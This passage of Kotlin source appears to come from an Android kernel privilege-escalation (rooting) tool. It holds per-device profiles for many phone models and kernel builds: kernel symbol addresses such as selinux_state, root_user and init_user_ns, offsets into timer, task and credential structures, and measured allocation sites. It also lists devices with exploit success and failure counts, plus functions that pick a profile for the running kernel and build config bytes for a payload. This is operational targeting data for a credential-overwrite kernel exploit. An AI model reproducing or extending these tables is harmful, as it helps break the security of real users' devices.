            prefix = "6.1.157-android14-11-gc7dd3fa941b3-ab15371444",
            models = listOf("BVL-N19"),
            release = "6.1.157-android14-11-gc7dd3fa941b3-ab15371444",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0081931C8uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A25B820uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A030780uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0304F0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A032008uL.toLong(),
                "init_groups" to 0xFFFFFFC00A031AA0uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xA8,
                credSiteLow21 = 0xE5044,
                taskAllocLow21 = 0xAA21C,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "CLE-AN00 / 6.1.128-android14",
            prefix = "6.1.128-android14-11-ge9da27488f45",
            models = listOf("CLE-AN00"),
            release = "6.1.128-android14-11-ge9da27488f45",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008381D50uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6DA9B0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A0B0998uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0B0708uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0B2228uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0B1CB8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x95FFC,
                taskAllocLow21 = 0xB88B0,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "JDY-L43P / 6.6.118-android15",
            prefix = "6.6.118-android15-8-g8b54898e6705-4k",
            models = listOf("JDY-L43P"),
            release = "6.6.118-android15-8-g8b54898e6705-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC08046D618uL.toLong(),
                "selinux_state" to 0xFFFFFFC08248BFF0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC08224F330uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08224F0A0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082250E00uL.toLong(),
                "init_groups" to 0xFFFFFFC082250890uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xA8,
                credSiteLow21 = 0x3497C,
                taskAllocLow21 = 0x183CAC,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "MAA-AN10 / 5.15.180-android13",
            prefix = "5.15.180-android13-8-gb652f2620acb",
            models = listOf("MAA-AN10"),
            release = "5.15.180-android13-8-gb652f2620acb",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008662754uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B3BF638uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AD34320uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00B208420uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AD35B40uL.toLong(),
                "init_groups" to 0xFFFFFFC00AD356D8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x110, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x750, taskComm = 0x760,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x3FF48,
                taskAllocLow21 = 0x26F24,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "MAG-AN00 / 5.15.180-android13",
            prefix = "5.15.180-android13-8-g938a6e3184bd",
            models = listOf("MAG-AN00"),
            release = "5.15.180-android13-8-g938a6e3184bd",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008662754uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B3BF638uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AD34320uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00B208420uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AD35B40uL.toLong(),
                "init_groups" to 0xFFFFFFC00AD356D8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x110, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x750, taskComm = 0x760,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x3FF48,
                taskAllocLow21 = 0x26F24,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "PGT-AN10 / 5.15.180-android13 · 1c54d61",
            prefix = "5.15.180-android13-8-g1c54d617912d",
            models = listOf("PGT-AN10"),
            release = "5.15.180-android13-8-g1c54d617912d",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008662754uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B3BF638uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AD34320uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00B208420uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AD35B40uL.toLong(),
                "init_groups" to 0xFFFFFFC00AD356D8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x110, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x750, taskComm = 0x760,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x3FF48,
                taskAllocLow21 = 0x26F24,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "PGT-AN10 / 5.15.180-android13 · 49611f0",
            prefix = "5.15.180-android13-8-g49611f0c0136",
            models = listOf("PGT-AN10"),
            release = "5.15.180-android13-8-g49611f0c0136",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008651C60uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B3AE638uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AD24320uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00B1F82A0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AD25B40uL.toLong(),
                "init_groups" to 0xFFFFFFC00AD256D8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x110, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x750, taskComm = 0x760,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x3FF7C,
                taskAllocLow21 = 0x26F70,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "ROL-W00 / 6.1.157-android14",
            prefix = "6.1.157-android14-11-g325066eea80d",
            models = listOf("ROL-W00"),
            release = "6.1.157-android14-11-g325066eea80d",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC00858EB74uL.toLong(),
                "selinux_state" to 0xFFFFFFC00AC2F1B8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A5D0510uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00AA628B0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A5D0A88uL.toLong(),
                "init_groups" to 0xFFFFFFC00A5D05B8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x160464,
                taskAllocLow21 = 0x58A50,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "5.15.123-android13",
            prefix = "5.15.123-android13-8-gf1f05f80aabb",
            release = "5.15.123-android13-8-gf1f05f80aabb",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0082A6030uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B4B0888uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AE21D10uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00B2EE490uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AE23530uL.toLong(),
                "init_groups" to 0xFFFFFFC00AE230C8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x110, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x750, taskComm = 0x760,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xA4,
                credSiteLow21 = 0x1A9748,
                taskAllocLow21 = 0x14E67C,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "6.1.157-android14",
            prefix = "6.1.157-android14-11-g8ed20bdebf81",
            release = "6.1.157-android14-11-g8ed20bdebf81",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC00859FE58uL.toLong(),
                "selinux_state" to 0xFFFFFFC00AC2CDB8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A5D0510uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00AA626B0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A5D0A88uL.toLong(),
                "init_groups" to 0xFFFFFFC00A5D05B8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x165878,
                taskAllocLow21 = 0x6B5C4,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "6.1.99-android14",
            prefix = "6.1.99-android14-11-gd6fcc757629f",
            release = "6.1.99-android14-11-gd6fcc757629f",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC00838AE50uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6D9A10uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A0B01D8uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0AFF48uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0B1A68uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0B14F8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0xE0CF4,
                taskAllocLow21 = 0x7EBF4,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "VKP-N39 / 6.6.118-android15",
            prefix = "6.6.118-android15-8-gc901ea41aa32-ab15981388-4k",
            models = listOf("VKP-N39"),
            release = "6.6.118-android15-8-gc901ea41aa32-ab15981388-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC080195CA8uL.toLong(),
                "selinux_state" to 0xFFFFFFC08236A2E0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC08213F1E0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08213EF50uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082140CB0uL.toLong(),
                "init_groups" to 0xFFFFFFC082140740uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xA8,
                credSiteLow21 = 0xE4064,
                taskAllocLow21 = 0xAB93C,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "WKL-AN80 / 6.18.21-android17",
            prefix = "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k",
            models = listOf("WKL-AN80"),
            release = "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803DFFA4uL.toLong(),
                "selinux_state" to 0xFFFFFFC08299A6F0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC082711390uL.toLong(),
                "init_user_ns" to 0xFFFFFFC0827110E0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082712F08uL.toLong(),
                "init_groups" to 0xFFFFFFC082712A48uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x180, itimerNode = 0xE0, itimerHead = 0x100, itimerElist = 0x110,
                itimerFiring = 0x120, itimerHandling = 0x128,
                taskCred = 0x908, taskComm = 0x918,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x147378,
                taskAllocLow21 = 0x246A8,
                taskAllocBytes = 0x1280,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "WKL-N59 / 6.18.21-android17",
            prefix = "6.18.21-android17-5-g52885947a517-ab16374447-4k",
            models = listOf("WKL-N59"),
            release = "6.18.21-android17-5-g52885947a517-ab16374447-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803DA2C4uL.toLong(),
                "selinux_state" to 0xFFFFFFC082999630uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC082711388uL.toLong(),
                "init_user_ns" to 0xFFFFFFC0827110D8uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082712F08uL.toLong(),
                "init_groups" to 0xFFFFFFC082712A48uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x180, itimerNode = 0xE0, itimerHead = 0x100, itimerElist = 0x110,
                itimerFiring = 0x120, itimerHandling = 0x128,
                taskCred = 0x908, taskComm = 0x918,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x153520,
                taskAllocLow21 = 0x1564C,
                taskAllocBytes = 0x1280,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "YAG-W10 / 5.15.180-android13",
            prefix = "5.15.180-android13-8-g69dabf204ec1",
            models = listOf("YAG-W10"),
            release = "5.15.180-android13-8-g69dabf204ec1",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0085BA8C4uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B3455D0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00ACB23A0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00B182C70uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00ACB3C30uL.toLong(),
                "init_groups" to 0xFFFFFFC00ACB3768uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x798, taskComm = 0x7A8,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x90,
                credSiteLow21 = 0x43730,
                taskAllocLow21 = 0xA96D4,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),
    )

    /**
     * 全部内置内核档案 = 本地标定出来的 + 额外档案拼出来的（5.10 那批）。
     * 后者没有 BTF 也能成立，因为偏移与 call site 都随档案下发。
     */
    val PROFILES: List<Profile> = BUILTIN_PROFILES

data class Known(
        val model: String,
        val release: String,
        val short: String,
        val kernelSha: String,
        val tag: String,
        val success: Int,
        val failure: Int,
        val verified: Boolean,
    )

    val KNOWN: List<Known> = listOf(
        Known("AAK-AN00", "6.6.118-android15-8-gf17133276a57-abogki518694926-4k", "6.6.118-android15-8", "e8ce5dbf904e", "AAK-AN00_6.6.118-android15-8", 2, 1, true),
        Known("AMG-AN00", "6.1.157-android14-11-g2646292297b1", "6.1.157-android14-11", "84de5b000c4e", "AMG-AN00_6.1.157-android14-11", 20, 12, true),
        Known("AMP-AN10", "6.1.157-android14-11-g2646292297b1", "6.1.157-android14-11", "7cee5cf2d9b4", "AMP-AN10_6.1.157-android14-11", 27, 6, true),
        Known("APH-AN00", "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k", "6.12.58-android16-6", "2b158518f343", "APH-AN00_6.12.58-android16-6", 13, 4, true),
        Known("BVL-AN00", "6.1.157-android14-11-g7d3922fade43", "6.1.157-android14-11", "c0763623d248", "BVL-AN00_6.1.157-android14-11", 3, 0, true),
        Known("CGL-W60", "6.1.157-android14-11-gaaa383620ebf", "6.1.157-android14-11", "fd37e9004575", "CGL-W60_6.1.157-android14-11", 13, 45, true),
        Known("ELP-AN00", "6.1.128-android14-11-gec1055c9cbb5", "6.1.128-android14-11", "a928b82a79da", "ELP-AN00_6.1.128-android14-11", 19, 12, true),
        Known("MTN-AN00", "6.1.157-android14-11-g19a495a97bff", "6.1.157-android14-11", "d12938d9ccb5", "MTN-AN00_6.1.157-android14-11", 95, 87, true),
        Known("PTP-AN10", "6.6.118-android15-8-ga812a1946391-abogki576098434-4k", "6.6.118-android15-8", "195236370c8a", "PTP-AN10_6.6.118-android15-8", 4, 2, true),
        Known("PTP-AN10", "6.6.89-android15-8-g9f1d85cc0389-abogki440235034-4k", "6.6.89-android15-8", "96a9bc9e8c9b", "PTP-AN10_6.6.89-android15-8", 1, 0, true),
        Known("ROD2-W09", "6.1.157-android14-11-g8d63307071ad", "6.1.157-android14-11", "f5dbbced5a8d", "ROD2-W09_6.1.157-android14-11", 3, 0, true),
        // 来自另一份安装包里 30 个 per-build 目录（assets/98260-*/target.sh）。
        // 只做机型↔内核识别：这些 build 的常量烧进了各自的 exploit 二进制，
        // 我们没有对应的 boot.img，无法生成可跑的 device.cfg。
        Known("MLY-AN00", "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k", "6.12.58-android16-6", "", "98260", 0, 0, false),
        Known("BKQ-AN90", "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k", "6.12.58-android16-6", "", "98260", 0, 0, false),
        Known("BKQ-AN10", "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k", "6.12.23-android16-5", "", "98260-6123", 0, 0, false),
        Known("MLY-AN00", "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k", "6.12.23-android16-5", "", "98260-6123", 0, 0, false),
        Known("BSN-AN00", "6.12.58-android16-6-g459a4285ccf8-abogki532718632-4k", "6.12.58-android16-6", "", "98260-61258b", 0, 0, false),
        Known("MLY-AN00", "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k", "6.12.38-android16-5", "", "98260-6138", 0, 0, false),
        Known("BKQ-AN90", "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k", "6.12.38-android16-5", "", "98260-6138", 0, 0, false),
        Known("YLP-W00", "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k", "6.12.38-android16-5", "", "98260-6138y", 0, 0, false),
        Known("BKQ-AN10", "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k", "6.12.38-android16-5", "", "98260-6138y", 0, 0, false),
        Known("WKL-AN20", "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k", "6.18.21-android17-5", "", "98260-61821", 0, 0, false),
        Known("WKL-AN80", "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k", "6.18.21-android17-5", "", "98260-61821", 0, 0, false),
        Known("BRM-AN00", "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k", "6.18.21-android17-5", "", "98260-61821-brm", 0, 0, false),
        Known("MLY-AN00", "6.12.23-android16-5-gcd85666d7884-abogki452537391-4k", "6.12.23-android16-5", "", "98260-g856", 0, 0, false),
        Known("APT-AN00", "6.6.58-android15-8-g6484937db664-abogki407459068-4k", "6.6.58-android15-8", "", "98260-6658", 0, 0, false),
        Known("MTN-AN00", "6.1.128-android14-11-g2e1f0741dafb", "6.1.128-android14-11", "", "98260-g2e1f", 0, 0, false),
        Known("MTN-AN00", "6.1.128-android14-11-g8a4968670f1c", "6.1.128-android14-11", "", "98260-g8a496", 0, 0, false),
        Known("VKJ-AN90", "6.6.118-android15-8-g554929766a0d-abogki544555896-4k", "6.6.118-android15-8", "ebb5bd6e70c9", "VKJ-AN90_6.6.118-android15-8", 15, 17, true),
        Known("BRP-AN00", "5.10.198-android12-9-g9ed30d31c28f", "5.10.198-android12-9-g9ed30d31c28f", "5f5c0836bd38", "server/5.10", 0, 0, false),
        Known("BRP-N21", "5.10.198-android12-9-00042-g0d138ba1ecc5-ab11991821", "5.10.198-android12-9-00042-g0d138ba1ecc5-ab11991821", "75a53d4d122e", "server/5.10", 0, 0, false),
        Known("BRP-N21", "5.10.252-android12-9-00009-gf960ed27302b-ab15212796", "5.10.252-android12-9-00009-gf960ed27302b-ab15212796", "7d18c618a04b", "server/5.10", 0, 0, false),
        Known("BRP-N21", "5.10.236-android12-9-00006-g71f3aedc8b92-ab14427738", "5.10.236-android12-9-00006-g71f3aedc8b92-ab14427738", "daffbc2bbdac", "server/5.10", 0, 0, false),
        Known("BRP-N23", "5.10.226-android12-9-00051-ga13323220e07-ab12931418", "5.10.226-android12-9-00051-ga13323220e07-ab12931418", "7dbf423cdcdf", "server/5.10", 0, 0, false),
        Known("BRP-N23", "5.10.218-android12-9-00060-g821a11a160ed-ab12930949", "5.10.218-android12-9-00060-g821a11a160ed-ab12930949", "9f75c9227729", "server/5.10", 0, 0, false),
        Known("BRP-N23", "5.10.218-android12-9-00041-g124993efd06e-ab12385094", "5.10.218-android12-9-00041-g124993efd06e-ab12385094", "ad8d9ea0605f", "server/5.10", 0, 0, false),
        Known("BRP-N23", "5.10.226-android12-9-00064-gea4a6f067d3f-ab12969919", "5.10.226-android12-9-00064-gea4a6f067d3f-ab12969919", "f1702fbc154d", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.209-android12-9-gff94831502de", "5.10.209-android12-9-gff94831502de", "20a6e3ccf816", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.236-android12-9-gf6010a2c8c91", "5.10.236-android12-9-gf6010a2c8c91", "2126b3078cf7", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.236-android12-9-g25b49f2f55c3", "5.10.236-android12-9-g25b49f2f55c3", "2158d2de570c", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.226-android12-9-g6f07aaff1070", "5.10.226-android12-9-g6f07aaff1070", "2323ec4f6250", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.209-android12-9-g3abe7b356608", "5.10.209-android12-9-g3abe7b356608", "4191afee5307", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.209-android12-9-g2467314e07ed", "5.10.209-android12-9-g2467314e07ed", "43ac69795a5c", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.226-android12-9-g4f68a86f7df1", "5.10.226-android12-9-g4f68a86f7df1", "49c8cc3b1278", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.236-android12-9-g4c1abb41143c", "5.10.236-android12-9-g4c1abb41143c", "6de69109572b", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.236-android12-9-g282b5be2f1e7", "5.10.236-android12-9-g282b5be2f1e7", "6f5bcd18c3dc", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.226-android12-9-gd118e0c61d77", "5.10.226-android12-9-gd118e0c61d77", "7dea006d0287", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.209-android12-9-gd8792c1b1e6c", "5.10.209-android12-9-gd8792c1b1e6c", "815a7c2b1865", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.252-android12-9-gc44b5448b117", "5.10.252-android12-9-gc44b5448b117", "bd1cafd91b93", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.209-android12-9-g3e3689f36922", "5.10.209-android12-9-g3e3689f36922", "ca58b59e15c1", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.209-android12-9-g2035a035ac7c", "5.10.209-android12-9-g2035a035ac7c", "edd649acbf77", "server/5.10", 0, 0, false),
        Known("BRP-TN00", "5.10.198-android12-9-gfb773659efb4", "5.10.198-android12-9-gfb773659efb4", "fa2a4848cc4d", "server/5.10", 0, 0, false),
        Known("REP-AN00", "5.10.236-android12-9-g3c84ac3cc469", "5.10.236-android12-9-g3c84ac3cc469", "8f63996cf718", "server/5.10", 0, 0, false),
        Known("unknown", "5.10.236-android12-9-g4b262e5255ed", "5.10.236-android12-9-g4b262e5255ed", "8345f871120c", "server/5.10", 0, 0, false),
    )

    /** 已收录、但这台机器只能用标定补全的内核。 */
    fun knownFor(release: String?, @Suppress("UNUSED_PARAMETER") model: String? = null): Known? {
        if (release.isNullOrBlank()) return null
        // 先按内核 key 认：同一颗内核不管装在哪个型号上都算「已收录」
        val key = kernelKey(release)
        val exact = KNOWN.filter { kernelKey(it.release) == key }
        val hits = if (exact.isNotEmpty()) exact else KNOWN.filter { release.startsWith(it.release) }
        return hits.firstOrNull()
    }


    /**
 * 机型统一按 "XXX-XXXX" 取键：PPG-AN00 / MTN-AN80 / PTP-AN10 / ROD2-W09。
 * 厂商常在 Build.MODEL 后面带后缀（PPG-AN00B、MTN-AN00-cn），只比前半段才不会漏。
 */
fun modelKey(model: String?): String? {
    val m = model?.trim()?.uppercase() ?: return null
    return Regex("^([A-Z0-9]{2,6})-([A-Z0-9]{3,5})").find(m)?.value
}


/** 当前内核能直接对上哪个内置 profile。 */
    fun profileFor(release: String?, @Suppress("UNUSED_PARAMETER") model: String? = null): Profile? {
        if (release.isNullOrBlank()) return null
        // 只认内核：版本号 + g<hash>。同一颗内核装在哪个型号上都算命中，
        // 机型标记（models）不再参与判定——否则「同内核不同机型」会被误挡。
        val key = kernelKey(release)
        val exact = PROFILES.filter { kernelKey(it.release) == key }
        val hits = if (exact.isNotEmpty()) exact else PROFILES.filter { release.startsWith(it.prefix) }
        return hits.firstOrNull()
    }

    /**
     * 下发给 payload 的 cfg 字节。
